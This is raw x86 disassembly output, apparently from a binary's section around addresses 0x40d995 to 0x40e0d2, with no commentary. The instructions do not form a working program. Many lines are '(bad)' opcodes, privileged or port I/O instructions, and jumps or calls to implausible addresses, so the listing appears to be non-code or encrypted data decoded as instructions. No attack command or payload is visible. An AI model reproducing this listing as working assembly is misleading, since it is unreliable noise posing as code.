  40d995:	mov    ds:0xe0f288c0,eax
  40d99a:	fldenv [ecx-0x4]
  40d99d:	jb     0x40d9b5
  40d99f:	shl    cl,1
  40d9a1:	paddb  mm3,QWORD PTR [edi]
  40d9a4:	aas    
  40d9a5:	mov    esp,0xe6080ecb
  40d9aa:	cli    
  40d9ab:	lds    ebp,FWORD PTR [ebx+ecx*4+0x5437e4ea]
  40d9b2:	adc    ebp,ebp
  40d9b4:	aad    0x5c
  40d9b6:	fwait
  40d9b7:	loopne 0x40d9ab
  40d9b9:	fs ins DWORD PTR es:[edi],dx
  40d9bb:	fadd   DWORD PTR ds:0x16309228
  40d9c1:	push   cs
  40d9c2:	sbb    edi,eax
  40d9c4:	imul   esp,ecx,0x5b17d1c2
  40d9ca:	sar    al,1
  40d9cc:	repz push cs
  40d9ce:	cmc    
  40d9cf:	sbb    BYTE PTR [ecx],cl
  40d9d1:	push   es
  40d9d2:	fdivr  QWORD PTR [esi+0x4e]
  40d9d5:	ins    BYTE PTR es:[edi],dx
  40d9d6:	sub    al,0x2
  40d9d8:	gs mov ebp,0x43a14782
  40d9de:	inc    DWORD PTR [eax+0x27]
  40d9e1:	fidiv  WORD PTR [edx-0x7f]
  40d9e4:	mov    ss:0xaaeccf94,eax
  40d9ea:	in     eax,dx
  40d9eb:	mov    bl,0xf2
  40d9ed:	iret   
  40d9ee:	inc    esi
  40d9ef:	stos   DWORD PTR es:[edi],eax
  40d9f0:	mov    ebp,DWORD PTR [edx]
  40d9f2:	int    0x2d
  40d9f4:	cdq    
  40d9f5:	xchg   ebp,eax
  40d9f6:	xor    al,0x98
  40d9f8:	hlt    
  40d9f9:	mov    WORD PTR [esi],ss
  40d9fb:	dec    ebp
  40d9fc:	mov    cl,0x5d
  40d9fe:	loop   0x40d9de
  40da00:	pusha  
  40da01:	pop    ebx
  40da02:	push   ecx
  40da03:	inc    edi
  40da04:	jp     0x40da76
  40da06:	adc    dh,BYTE PTR [edx]
  40da08:	xor    BYTE PTR [ecx+0x2d20cbb2],dl
  40da0e:	inc    esi
  40da0f:	sub    DWORD PTR [ecx+ebp*2+0x19d8b06b],edi
  40da16:	and    eax,0xf189455e
  40da1b:	outs   dx,BYTE PTR ds:[esi]
  40da1c:	jo     0x40d9b6
  40da1e:	adc    eax,0x720ea3e4
  40da23:	or     ah,BYTE PTR [edx+0x5778eeae]
  40da29:	adc    BYTE PTR [eax-0x71],dh
  40da2c:	int    0xf1
  40da2e:	fcom   DWORD PTR [ebp+0xb]
  40da31:	imul   eax,DWORD PTR [edx-0x5c],0xffffffb5
  40da35:	jns    0x40d9db
  40da37:	repnz ins DWORD PTR es:[edi],dx
  40da39:	cmp    bh,BYTE PTR [edi+0x6b61204a]
  40da3f:	sbb    DWORD PTR [si-0x2e],edx
  40da43:	mov    dl,dl
  40da45:	aad    0xd
  40da47:	or     eax,0x6076de43
  40da4c:	push   cs
  40da4d:	mov    al,0x2
  40da4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da50:	cmc    
  40da51:	(bad)  
  40da52:	out    dx,eax
  40da53:	mov    dh,BYTE PTR [ebp-0x262884b8]
  40da59:	int3   
  40da5a:	jno    0x40d9f5
  40da5c:	sbb    ah,0xf1
  40da5f:	mov    edx,ss
  40da61:	inc    ecx
  40da62:	out    dx,al
  40da63:	jge    0x40da51
  40da65:	sahf   
  40da66:	push   ds
  40da67:	jge    0x40da88
  40da69:	inc    eax
  40da6a:	jbe    0x40da62
  40da6c:	daa    
  40da6d:	or     BYTE PTR [edx],0x33
  40da70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da71:	xlat   BYTE PTR ds:[ebx]
  40da72:	test   eax,0xf068ea85
  40da77:	in     eax,0x13
  40da79:	lods   al,BYTE PTR ds:[esi]
  40da7a:	cmp    DWORD PTR [edx],esp
  40da7c:	push   0x811ca33
  40da81:	xlat   BYTE PTR ds:[ebx]
  40da82:	sbb    dh,bl
  40da84:	jmp    0x95906e33
  40da89:	pop    ecx
  40da8a:	pop    eax
  40da8b:	mov    DWORD PTR [ecx],0x52ede7f1
  40da91:	stc    
  40da92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da93:	add    ebx,ecx
  40da95:	jne    0x40da9e
  40da97:	int3   
  40da98:	dec    edi
  40da99:	inc    esi
  40da9a:	jle    0x40da21
  40da9c:	dec    edi
  40da9d:	pop    ecx
  40da9e:	add    BYTE PTR [edi-0x6f80104a],ah
  40daa4:	dec    edi
  40daa5:	mov    bl,0xc1
  40daa7:	bound  edx,QWORD PTR [edx]
  40daa9:	ficomp WORD PTR [ecx]
  40daab:	in     eax,0xe1
  40daad:	jb     0x40dafb
  40daaf:	(bad)  
  40dab0:	adc    dh,BYTE PTR [ecx+ebx*4]
  40dab3:	test   DWORD PTR [ebp-0x20],eax
  40dab6:	xchg   DWORD PTR [eax],ecx
  40dab8:	js     0x40da85
  40daba:	mov    edx,0x9fa12774
  40dabf:	and    al,0x27
  40dac1:	pop    edi
  40dac2:	outs   dx,BYTE PTR ds:[esi]
  40dac3:	pop    edx
  40dac4:	sbb    eax,0xa1a180d8
  40dac9:	push   edx
  40daca:	cwde   
  40dacb:	test   al,0x57
  40dacd:	shrd   DWORD PTR [ecx],ebp,cl
  40dad0:	mov    eax,ds:0x20108a07
  40dad5:	xchg   edi,eax
  40dad6:	and    eax,0xcea4a06c
  40dadb:	push   edi
  40dadc:	mov    al,0x84
  40dade:	cmp    DWORD PTR [ebp-0x2f8ba5a6],edx
  40dae4:	retf   
  40dae5:	adc    BYTE PTR [ecx],0x93
  40dae8:	aam    0xde
  40daea:	adc    bh,cl
  40daec:	mul    BYTE PTR [edx+0x478a472b]
  40daf2:	inc    esi
  40daf3:	retf   0xf382
  40daf6:	dec    ecx
  40daf7:	sub    eax,0x4e9e776d
  40dafc:	test   eax,0x631491dd
  40db01:	(bad)  
  40db02:	pop    ebp
  40db03:	les    edx,FWORD PTR [ebx]
  40db05:	and    eax,0x2627b2b0
  40db0a:	or     eax,0x9bdbe155
  40db0f:	int    0x8
  40db11:	mov    dl,0x12
  40db13:	ror    DWORD PTR [ebp+ecx*1-0x36],cl
  40db17:	or     bh,BYTE PTR [edx]
  40db19:	mov    cl,0xac
  40db1b:	fcomip st,st(6)
  40db1d:	jg     0x40db91
  40db1f:	pop    es
  40db20:	push   ecx
  40db21:	and    ebp,DWORD PTR [edx+ebx*8]
  40db24:	inc    esi
  40db25:	(bad)  
  40db26:	push   esi
  40db27:	cs into 
  40db29:	test   eax,0x4f830ac1
  40db2e:	pop    eax
  40db2f:	xchg   edi,eax
  40db30:	repz das 
  40db32:	push   ebx
  40db33:	push   es
  40db34:	push   ebx
  40db35:	sub    BYTE PTR [esi-0x67],0x2c
  40db39:	mov    ch,0x87
  40db3b:	shr    edx,0x21
  40db3e:	add    al,0x2
  40db40:	loopne 0x40db14
  40db42:	sub    ebp,DWORD PTR [eax]
  40db44:	fisubr WORD PTR [edx]
  40db46:	loop   0x40db88
  40db48:	xchg   ebx,eax
  40db49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db4a:	push   ebp
  40db4b:	cmp    al,0xc
  40db4d:	sbb    BYTE PTR [ebx],bl
  40db4f:	cli    
  40db50:	mov    ebx,DWORD PTR [ecx+0x27924d11]
  40db56:	out    0x79,al
  40db58:	mov    edx,DWORD PTR [ebp+0x29]
  40db5b:	imul   esi,DWORD PTR [esi],0xffffffc6
  40db5e:	jmp    0x7df6:0x7af9f185
  40db65:	cmp    DWORD PTR [edi+ebp*1],ebp
  40db68:	fs sbb eax,0x188ebb6f
  40db6e:	sub    BYTE PTR [edi+0x44],dh
  40db71:	psrlw  mm1,QWORD PTR [edi+0x3e3f7b0c]
  40db78:	sub    cl,BYTE PTR [esi-0x3d]
  40db7b:	mov    ebx,DWORD PTR [ecx+ecx*4]
  40db7e:	jnp    0x40dbfa
  40db80:	xchg   DWORD PTR [esi-0x6e],eax
  40db83:	imul   ecx,DWORD PTR ds:0xe813d153,0xd4e16a
  40db8d:	mov    ds:0x289762a2,al
  40db92:	hlt    
  40db93:	sub    esp,DWORD PTR [ebx+0x6]
  40db96:	loop   0x40db90
  40db98:	cld    
  40db99:	lods   al,BYTE PTR ds:[esi]
  40db9a:	push   ss
  40db9b:	inc    eax
  40db9c:	xor    eax,0x75249f74
  40dba1:	gs add eax,0xbbd97607
  40dba7:	es popa 
  40dba9:	push   ds
  40dbaa:	sub    BYTE PTR [eax+edx*2],0x4e
  40dbae:	fbstp  TBYTE PTR [edi]
  40dbb0:	cld    
  40dbb1:	or     al,0xaf
  40dbb3:	iret   
  40dbb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbb5:	pop    esp
  40dbb6:	inc    ecx
  40dbb7:	xchg   esi,eax
  40dbb8:	popa   
  40dbb9:	add    DWORD PTR [esi],0x3c
  40dbbc:	aaa    
  40dbbd:	shr    DWORD PTR [ebx],cl
  40dbbf:	iret   
  40dbc0:	or     BYTE PTR [ecx-0x71],ah
  40dbc3:	adc    DWORD PTR [ebx+0x7c],edi
  40dbc6:	push   eax
  40dbc7:	popf   
  40dbc8:	(bad)  
  40dbca:	jmp    0x44b4:0x5b6731d8
  40dbd1:	mov    bh,0x53
  40dbd3:	scas   al,BYTE PTR es:[edi]
  40dbd4:	aaa    
  40dbd5:	xor    edi,ecx
  40dbd7:	pop    DWORD PTR [eax]
  40dbd9:	and    al,0x1a
  40dbdb:	mov    esp,0xf50a6bb8
  40dbe0:	push   esp
  40dbe1:	jge    0x40dbaf
  40dbe3:	inc    esp
  40dbe4:	daa    
  40dbe5:	dec    ebx
  40dbe6:	pop    ebp
  40dbe7:	xor    eax,0x620e54d9
  40dbec:	dec    ecx
  40dbed:	sahf   
  40dbee:	lds    eax,FWORD PTR [ebp+0x66]
  40dbf1:	sub    bl,bh
  40dbf3:	pop    ebx
  40dbf4:	xor    DWORD PTR [edx],ebp
  40dbf6:	add    ecx,edi
  40dbf8:	xchg   DWORD PTR [esi-0x2700e47d],esp
  40dbfe:	xchg   ebx,eax
  40dbff:	cld    
  40dc00:	lods   al,BYTE PTR ds:[esi]
  40dc01:	jl     0x40dc74
  40dc03:	fst    DWORD PTR [ecx+0x1fb77634]
  40dc09:	(bad)  
  40dc0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc0b:	mov    al,0x47
  40dc0e:	adc    al,0x5b
  40dc10:	popf   
  40dc11:	arpl   WORD PTR [esi+ebx*2-0x4d998cb0],cx
  40dc18:	and    ecx,eax
  40dc1a:	xchg   DWORD PTR [eax-0x1debb702],eax
  40dc20:	and    al,0x60
  40dc22:	and    eax,0xda233a35
  40dc27:	dec    esp
  40dc28:	and    eax,0x6bd264d3
  40dc2d:	lea    edx,[ebp+eax*1-0x45eeea3]
  40dc34:	mov    ebx,0x2a93a8d2
  40dc39:	aam    0xbf
  40dc3b:	jmp    0x40dc0f
  40dc3d:	lds    ecx,FWORD PTR [edi-0x642f5be8]
  40dc43:	je     0x40dc3b
  40dc45:	inc    BYTE PTR [ebp-0x61e0be7d]
  40dc4b:	ret    0xddb9
  40dc4e:	inc    ebx
  40dc4f:	mov    ds:0xe7fd2945,eax
  40dc54:	push   0xdd5b250c
  40dc59:	add    esp,ecx
  40dc5b:	popa   
  40dc5c:	jmp    0xc496:0x8b29ae70
  40dc63:	rcr    DWORD PTR [eax],0xd2
  40dc66:	sbb    ebp,edx
  40dc68:	pop    DWORD PTR [esp+ebp*4]
  40dc6b:	rol    DWORD PTR [eax-0x29],cl
  40dc6e:	pushf  
  40dc6f:	dec    eax
  40dc70:	inc    edx
  40dc71:	sahf   
  40dc72:	loope  0x40dcea
  40dc74:	iret   
  40dc75:	mov    dh,0xf0
  40dc77:	push   ds
  40dc78:	or     dh,al
  40dc7a:	fimul  DWORD PTR [esi]
  40dc7c:	jo     0x40dc16
  40dc7e:	add    esp,eax
  40dc80:	and    esi,ecx
  40dc82:	ret    
  40dc83:	sub    esi,esi
  40dc85:	xchg   esp,eax
  40dc86:	pop    es
  40dc87:	or     BYTE PTR [edx+0x6c],bl
  40dc8a:	dec    ecx
  40dc8b:	loopne 0x40dc27
  40dc8d:	jb     0x40dcb4
  40dc8f:	sbb    BYTE PTR [ecx],dl
  40dc91:	clc    
  40dc92:	(bad)  
  40dc93:	out    0x4f,al
  40dc95:	cmp    al,0x42
  40dc97:	xlat   BYTE PTR ds:[ebx]
  40dc98:	jae    0x40dc4a
  40dc9a:	ret    
  40dc9b:	sbb    DWORD PTR [edi+0x5a],eax
  40dc9e:	add    al,0xd8
  40dca0:	ins    DWORD PTR es:[edi],dx
  40dca1:	xchg   ecx,eax
  40dca2:	retf   
  40dca3:	imul   ebx,DWORD PTR [edx-0x1a1a4f41],0xfcff296f
  40dcad:	fst    DWORD PTR [eax+0x3bc67b28]
  40dcb3:	sahf   
  40dcb4:	push   edi
  40dcb5:	push   ecx
  40dcb6:	cmp    eax,0x5a5a5c6d
  40dcbb:	and    DWORD PTR [ebx+0x61977ed8],ebp
  40dcc1:	fcmovu st,st(0)
  40dcc3:	mov    esp,0x4eb669f
  40dcc8:	shl    DWORD PTR [ebx*4-0x478ba63b],1
  40dccf:	push   ds
  40dcd0:	addr16 clc 
  40dcd2:	dec    ecx
  40dcd3:	mov    ch,0x13
  40dcd5:	call   0x3bc97c27
  40dcda:	mov    cl,0xc5
  40dcdc:	xchg   ebx,eax
  40dcdd:	out    dx,al
  40dcde:	mov    dh,0x46
  40dce0:	push   0xf
  40dce2:	xor    bl,BYTE PTR [edx-0x16c7e7cc]
  40dce8:	stc    
  40dce9:	or     ecx,0xffffffad
  40dcec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dced:	mov    ah,0x50
  40dcef:	addr16 xchg ebp,eax
  40dcf1:	mov    al,0x8f
  40dcf3:	add    BYTE PTR [esi-0x1d3c1e75],0x20
  40dcfa:	jb     0x40dd3a
  40dcfc:	cwde   
  40dcfd:	adc    edi,DWORD PTR [eax+eiz*2]
  40dd00:	xor    DWORD PTR [eax],0x275db889
  40dd06:	pop    ebp
  40dd07:	pop    ebp
  40dd08:	loopne 0x40dd30
  40dd0a:	inc    edi
  40dd0b:	dec    eax
  40dd0c:	bnd ret 0x316
  40dd10:	scas   eax,DWORD PTR es:[edi]
  40dd11:	idiv   DWORD PTR [esi+0x1b]
  40dd14:	test   DWORD PTR [esp+edi*1+0x47ebdcf1],edi
  40dd1b:	adc    eax,0x26a10f3b
  40dd20:	and    bh,BYTE PTR [eax+edi*2]
  40dd23:	es mov ebp,0x77d7c609
  40dd29:	cs aad 0xad
  40dd2c:	test   DWORD PTR [edi],0xa3687f08
  40dd32:	scas   eax,DWORD PTR es:[edi]
  40dd33:	xlat   BYTE PTR ds:[ebx]
  40dd34:	dec    ebx
  40dd35:	inc    BYTE PTR [eax+0x1fa6045]
  40dd3b:	fisttp DWORD PTR [eax+0x56231ed6]
  40dd41:	cmc    
  40dd42:	sar    al,0xba
  40dd45:	shl    DWORD PTR [eax+ebx*4],0x93
  40dd49:	es mov ebp,esi
  40dd4c:	sbb    DWORD PTR [ebp+ebx*2-0x6c],0xffffffa2
  40dd51:	in     al,dx
  40dd52:	sbb    eax,0x12e7bfb8
  40dd57:	mov    ds:0xe2353bdb,al
  40dd5c:	ret    
  40dd5d:	mov    ebp,0xea33e1b8
  40dd62:	dec    edx
  40dd63:	sub    DWORD PTR [ebp+0x743e63dc],ebp
  40dd69:	sar    DWORD PTR [ecx+0x4d300a51],1
  40dd6f:	jb     0x40dd98
  40dd71:	retf   0xa204
  40dd74:	outs   dx,DWORD PTR ds:[esi]
  40dd75:	and    DWORD PTR [ecx-0x44],esi
  40dd78:	sub    al,0xdf
  40dd7a:	mov    WORD PTR [edx-0x2dfc59ef],es
  40dd80:	mov    edi,DWORD PTR [ebx+ebp*2]
  40dd83:	push   ebp
  40dd84:	jp     0x40dd48
  40dd86:	xor    esi,DWORD PTR [edx]
  40dd88:	cmp    ch,ch
  40dd8a:	or     bh,BYTE PTR [edi+0x1a]
  40dd8d:	jno    0x40ddb2
  40dd8f:	int3   
  40dd90:	mov    DWORD PTR [esi+esi*8],ecx
  40dd93:	out    dx,al
  40dd94:	fadd   st(7),st
  40dd96:	dec    esi
  40dd97:	jle    0x40dda0
  40dd99:	rcr    BYTE PTR [esi+0x30],1
  40dd9c:	xchg   esi,eax
  40dd9d:	mov    al,ds:0x6802aa3b
  40dda2:	dec    eax
  40dda3:	ficom  DWORD PTR [edx-0x3e3c15f3]
  40dda9:	pop    ds
  40ddaa:	xor    eax,DWORD PTR [ebx+esi*2]
  40ddad:	mov    ch,0x7d
  40ddaf:	and    dh,BYTE PTR [edx+0x3c218050]
  40ddb5:	dec    esp
  40ddb6:	xchg   ebx,eax
  40ddb7:	es push edx
  40ddb9:	repnz cdq 
  40ddbb:	imul   edi,DWORD PTR [edx+0x3584ef98],0xffffff97
  40ddc2:	add    eax,0x29b67f2c
  40ddc7:	dec    ecx
  40ddc8:	and    ah,BYTE PTR [eax-0x6c]
  40ddcb:	in     eax,dx
  40ddcc:	sbb    esp,DWORD PTR [ebx]
  40ddce:	xchg   ebp,eax
  40ddcf:	int3   
  40ddd0:	fdivr  DWORD PTR [ebx]
  40ddd2:	jnp    0x40de01
  40ddd4:	cmp    BYTE PTR [edx],ah
  40ddd6:	adc    DWORD PTR [eax+ecx*1],esp
  40ddd9:	lahf   
  40ddda:	sbb    eax,0x580c7f62
  40dddf:	and    DWORD PTR [ebx],edx
  40dde1:	pop    ecx
  40dde2:	push   ebx
  40dde4:	and    DWORD PTR [ebx-0x8],edi
  40dde7:	cmp    al,0x4e
  40dde9:	popf   
  40ddea:	push   edi
  40ddeb:	sub    al,BYTE PTR [edi+eax*2]
  40ddee:	imul   ecx,edx,0xa
  40ddf1:	repz mov bl,0x92
  40ddf4:	sti    
  40ddf5:	(bad)  
  40ddf6:	sub    DWORD PTR ss:[ebx+0x78de33be],esi
  40ddfd:	mov    ds:0x773068df,eax
  40de02:	mov    esi,0x13d30e90
  40de07:	les    ebx,FWORD PTR [edx+0x31bd5bc0]
  40de0d:	cmp    DWORD PTR [eax],esp
  40de0f:	ret    0x494e
  40de12:	int3   
  40de13:	push   ebx
  40de14:	adc    BYTE PTR [esi-0x13],dl
  40de17:	jae    0x40dde5
  40de19:	stos   DWORD PTR es:[edi],eax
  40de1a:	or     edi,DWORD PTR [esi+ebp*8+0xe]
  40de1e:	sub    al,0x47
  40de20:	out    0x16,eax
  40de22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de23:	fistp  WORD PTR [ebx]
  40de25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de26:	jmp    0xf2a0db0c
  40de2b:	shl    DWORD PTR gs:[edi+esi*8+0x69],cl
  40de30:	ficom  DWORD PTR [edi-0x9]
  40de33:	mov    cl,0x75
  40de35:	inc    esp
  40de36:	test   eax,0x1c699ce5
  40de3b:	sub    DWORD PTR [ebp+0x275b05a8],eax
  40de41:	push   eax
  40de42:	jns    0x40deb5
  40de44:	sbb    dl,BYTE PTR [eax]
  40de46:	xor    BYTE PTR [esp+esi*8-0x7672af36],cl
  40de4d:	mov    ch,0xfb
  40de4f:	mov    edx,cs
  40de51:	popf   
  40de52:	ror    DWORD PTR [esi+0x422807ad],1
  40de58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de59:	das    
  40de5a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de5c:	test   DWORD PTR [edi+0x74b85caa],edi
  40de62:	(bad)  
  40de63:	fild   WORD PTR ds:0x89dfb4aa
  40de69:	sbb    ebx,eax
  40de6b:	pop    ecx
  40de6c:	sub    ebp,edx
  40de6e:	repnz mov ch,0x76
  40de71:	loope  0x40dea2
  40de73:	add    esp,DWORD PTR [ebx-0x40]
  40de76:	inc    edx
  40de77:	neg    BYTE PTR [ebp-0x8]
  40de7a:	jecxz  0x40de03
  40de7c:	jnp    0x40deb7
  40de7e:	push   0xffffff99
  40de80:	ret    
  40de81:	scas   eax,DWORD PTR es:[edi]
  40de82:	jle    0x40dee7
  40de84:	stos   DWORD PTR es:[edi],eax
  40de85:	in     al,0x2e
  40de87:	ror    DWORD PTR [edx+0x5c],0x18
  40de8b:	dec    ebp
  40de8c:	add    eax,0xf6e35aa2
  40de91:	daa    
  40de92:	les    edi,FWORD PTR [ebx+0x69]
  40de95:	test   cl,ah
  40de97:	icebp  
  40de98:	sbb    DWORD PTR [eax+0x6f],eax
  40de9b:	cs aam 0xd3
  40de9e:	jbe    0x40de87
  40dea0:	and    DWORD PTR [edx],esp
  40dea2:	pop    edx
  40dea3:	nop
  40dea4:	pusha  
  40dea5:	or     al,BYTE PTR [ecx+0x43]
  40dea8:	imul   ecx,DWORD PTR [ecx],0xffffffd2
  40deab:	retf   
  40deac:	stos   BYTE PTR es:[edi],al
  40dead:	mov    ds:0xc1154142,eax
  40deb2:	shr    DWORD PTR [ecx],1
  40deb4:	lock imul ebp,edx,0xcc137475
  40debb:	inc    edx
  40debc:	in     al,dx
  40debd:	add    al,BYTE PTR [eax+eiz*4+0x47ec7159]
  40dec4:	push   esi
  40dec5:	scas   eax,DWORD PTR es:[edi]
  40dec6:	imul   ecx,DWORD PTR [edi],0xfffffff4
  40dec9:	out    dx,eax
  40deca:	(bad)  
  40decb:	shr    DWORD PTR [esi+0x2fd3d9b1],0xf2
  40ded2:	inc    edi
  40ded3:	push   cs
  40ded4:	sbb    eax,0x7b6d806
  40ded9:	hlt    
  40deda:	xchg   BYTE PTR [edx+0x11],ch
  40dedd:	add    al,0x2f
  40dedf:	outs   dx,DWORD PTR ds:[esi]
  40dee0:	pushf  
  40dee1:	nop
  40dee2:	sbb    edx,0xda2fd193
  40dee8:	cmp    DWORD PTR ds:0x3c5e0c04,esp
  40deee:	jbe    0x40df6c
  40def0:	push   ebx
  40def1:	or     al,0xd0
  40def3:	sti    
  40def4:	lods   al,BYTE PTR ds:[esi]
  40def5:	jecxz  0x40deff
  40def7:	sbb    dl,BYTE PTR [edi+0x34]
  40defa:	(bad)  
  40defb:	sbb    DWORD PTR [edi],eax
  40defd:	iret   
  40defe:	clc    
  40deff:	shl    DWORD PTR [ebp+0x5b69b368],cl
  40df05:	adc    BYTE PTR [edi+0x17c20a13],bl
  40df0b:	pop    ss
  40df0c:	out    0x8f,eax
  40df0e:	lods   al,BYTE PTR ds:[esi]
  40df0f:	ja     0x40df30
  40df11:	ds sub ebx,edx
  40df14:	or     BYTE PTR es:[ecx],bh
  40df17:	jl     0x40df6f
  40df19:	jle    0x40dee7
  40df1b:	ret    
  40df1c:	cs jne 0x40df55
  40df1f:	out    0x31,eax
  40df21:	(bad)  
  40df22:	jle    0x40deaa
  40df24:	cmp    DWORD PTR [edi],edi
  40df26:	pop    ds
  40df27:	jl     0x40def0
  40df29:	inc    esi
  40df2a:	aad    0x2d
  40df2c:	out    dx,al
  40df2d:	jg     0x40df32
  40df2f:	imul   BYTE PTR [edx-0x6a03f59c]
  40df35:	cmc    
  40df36:	adc    al,0xcc
  40df38:	mov    WORD PTR [eax+0x1],?
  40df3b:	mov    ah,0x43
  40df3d:	jnp    0x40dec2
  40df3f:	mov    WORD PTR [eax+0x791a4c76],gs
  40df45:	add    DWORD PTR [ebp-0x79],edx
  40df48:	jne    0x40df80
  40df4a:	out    dx,eax
  40df4b:	shr    DWORD PTR ds:0x5a98b5cd,0x7c
  40df52:	and    ebp,DWORD PTR [ebx]
  40df54:	outs   dx,BYTE PTR ds:[esi]
  40df55:	add    BYTE PTR [edx],ah
  40df57:	sub    DWORD PTR [edi+0x15],esp
  40df5a:	rol    BYTE PTR [ebx-0x43],0x38
  40df5e:	or     al,0xca
  40df60:	mov    esp,0x4dab9dbb
  40df65:	in     al,dx
  40df66:	jbe    0x40df92
  40df68:	inc    esi
  40df69:	adc    eax,DWORD PTR ds:0x21e34e56
  40df6f:	lock sbb esi,DWORD PTR [edi]
  40df72:	into   
  40df73:	inc    edi
  40df74:	je     0x40df76
  40df76:	js     0x40dfd7
  40df78:	add    bl,bl
  40df7a:	mov    bl,0xc
  40df7c:	fstp   QWORD PTR [ecx-0x27]
  40df7f:	xor    edx,DWORD PTR ds:0x5f54707a
  40df85:	sbb    cl,bh
  40df87:	sub    al,al
  40df89:	mov    ch,0x46
  40df8b:	call   0x3533119f
  40df90:	add    BYTE PTR ds:0xa56e8e59,ch
  40df96:	push   0x13
  40df98:	je     0x40df3e
  40df9a:	lea    ebp,[esp+eax*8-0x610c637b]
  40dfa1:	add    esi,DWORD PTR [ecx+0x4a4e7d08]
  40dfa7:	xchg   ecx,eax
  40dfa8:	retf   0xe988
  40dfab:	in     al,dx
  40dfac:	xor    al,BYTE PTR [eax-0x23]
  40dfaf:	sbb    al,0xd
  40dfb1:	add    BYTE PTR [edi],bh
  40dfb3:	loopne 0x40dfa9
  40dfb5:	xor    al,0x3a
  40dfb7:	sti    
  40dfb8:	push   0x3e
  40dfba:	nop
  40dfbb:	pop    ss
  40dfbc:	fdiv   st(6),st
  40dfbe:	sahf   
  40dfbf:	mov    dh,0x79
  40dfc1:	xchg   edx,eax
  40dfc2:	mov    BYTE PTR [esi],al
  40dfc4:	ret    
  40dfc5:	stos   BYTE PTR es:[edi],al
  40dfc6:	fstp   DWORD PTR [ebp-0x1b]
  40dfc9:	push   edx
  40dfca:	cdq    
  40dfcb:	pop    ecx
  40dfcc:	loope  0x40dfda
  40dfce:	rcr    BYTE PTR [esi],0xfa
  40dfd1:	dec    esp
  40dfd2:	outs   dx,BYTE PTR ds:[esi]
  40dfd3:	mov    WORD PTR [ebp-0x53],ds
  40dfd6:	adc    al,0x70
  40dfd8:	mov    esi,DWORD PTR fs:0x58f9685a
  40dfdf:	push   es
  40dfe0:	div    bl
  40dfe2:	push   ebp
  40dfe3:	push   ebx
  40dfe4:	dec    eax
  40dfe6:	mov    edx,0xe0a08475
  40dfeb:	lahf   
  40dfec:	inc    ebx
  40dfed:	sar    BYTE PTR [ebx],0x62
  40dff0:	shl    DWORD PTR [eax],1
  40dff2:	mov    edx,0x81f1fcea
  40dff7:	push   0x2868e5ca
  40dffc:	rol    BYTE PTR [ecx+0x2a],1
  40dfff:	or     bh,BYTE PTR [ebp+0x58]
  40e002:	mov    dh,0xf5
  40e004:	retf   
  40e005:	ins    BYTE PTR es:[edi],dx
  40e006:	rcr    al,1
  40e008:	enter  0x35a5,0x2
  40e00c:	adc    BYTE PTR [ebp-0x60],dl
  40e00f:	push   ecx
  40e010:	rcr    DWORD PTR [ecx],1
  40e012:	bound  edx,QWORD PTR [ebx]
  40e014:	sbb    eax,DWORD PTR [ebx+0x3bb027de]
  40e01a:	adc    DWORD PTR [ebx+eiz*2],eax
  40e01d:	dec    ecx
  40e01e:	inc    esp
  40e01f:	(bad)  
  40e020:	out    0x60,eax
  40e022:	aas    
  40e023:	dec    esp
  40e024:	das    
  40e025:	push   ds
  40e026:	daa    
  40e027:	imul   DWORD PTR [edi-0x23]
  40e02a:	adc    edi,DWORD PTR [edi+0x1a]
  40e02d:	sbb    bl,BYTE PTR [ecx-0x1a0af092]
  40e033:	daa    
  40e034:	cmp    cl,BYTE PTR [edi+0x72c749d3]
  40e03a:	xlat   BYTE PTR ds:[ebx]
  40e03b:	das    
  40e03c:	sub    ch,dh
  40e03e:	call   0x30eacf06
  40e043:	dec    esi
  40e044:	pop    ecx
  40e045:	mov    dl,BYTE PTR [esi+0x54]
  40e048:	jl     0x40e09b
  40e04a:	stos   BYTE PTR es:[edi],al
  40e04b:	stos   BYTE PTR es:[edi],al
  40e04c:	nop
  40e04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e04e:	add    bh,BYTE PTR [ebp+0x1f]
  40e051:	and    DWORD PTR [ecx-0x141d5e6d],ecx
  40e057:	loop   0x40e035
  40e059:	test   eax,0xcd900fb4
  40e05e:	adc    DWORD PTR [esi-0x3edbc1cf],esp
  40e064:	cs inc ecx
  40e066:	add    bh,BYTE PTR [edx]
  40e068:	pop    ds
  40e069:	xchg   DWORD PTR [edx+0x18ec8915],ebp
  40e06f:	and    BYTE PTR [esi],al
  40e071:	xor    bh,bl
  40e073:	mov    bh,0x9d
  40e075:	(bad)  
  40e076:	adc    edx,DWORD PTR [edx+0x5d]
  40e079:	push   eax
  40e07a:	dec    esi
  40e07b:	(bad)
  40e07e:	add    eax,0xe3fdb3f2
  40e083:	lock jo 0x40e06e
  40e086:	je     0x40e02b
  40e088:	rol    BYTE PTR [eax],0x57
  40e08b:	dec    edi
  40e08c:	imul   ebp,DWORD PTR [ecx+0x56c7e848],0x2f93f3b7
  40e096:	jecxz  0x40e0e6
  40e098:	jecxz  0x40e0bc
  40e09a:	sbb    al,0xbc
  40e09c:	jge    0x40e0a8
  40e09e:	sub    eax,0x39cc959a
  40e0a3:	cdq    
  40e0a4:	mov    DWORD PTR [esi+edi*1+0x67cff408],edx
  40e0ab:	xchg   edx,eax
  40e0ac:	pop    ss
  40e0ad:	stc    
  40e0ae:	jbe    0x40e063
  40e0b0:	fmul   DWORD PTR [ecx+edi*4]
  40e0b3:	pop    ss
  40e0b4:	mov    ds:0x960d8fb7,al
  40e0b9:	pop    eax
  40e0ba:	sti    
  40e0bb:	cmp    al,0x65
  40e0bd:	jl     0x40e046
  40e0bf:	mov    ds:0xfcbd7668,eax
  40e0c4:	sub    al,0xc0
  40e0c6:	arpl   WORD PTR [edi],bp
  40e0c8:	mov    eax,ds:0x8c857d5e
  40e0cd:	aas    
  40e0ce:	or     al,0x28
  40e0d0:	mov    ah,0x8c
  40e0d2:	popf   
